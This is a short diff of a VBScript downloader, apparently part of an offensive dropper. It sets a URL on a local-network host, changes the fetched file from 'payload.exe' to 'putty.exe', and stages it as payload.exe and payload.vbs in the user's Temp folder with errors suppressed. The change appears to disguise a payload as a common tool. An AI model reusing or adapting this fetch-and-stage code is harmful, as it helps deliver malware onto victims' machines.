@@ -11,7 +11,7 @@
 		On Error Resume Next
 		
 		' http://www.codeproject.com/Tips/506439/Downloading-files-with-VBScript
-		strURL = "http://192.168.1.8:8000/payload.exe"
+		strURL = "http://192.168.1.19/putty.exe"
 		Set objShell = CreateObject("WScript.Shell")
 		strScriptPath = objShell.ExpandEnvironmentStrings("%Temp%") & "\" & "payload.vbs"
 		strPayloadPath = objShell.ExpandEnvironmentStrings("%Temp%") & "\" & "payload.exe"
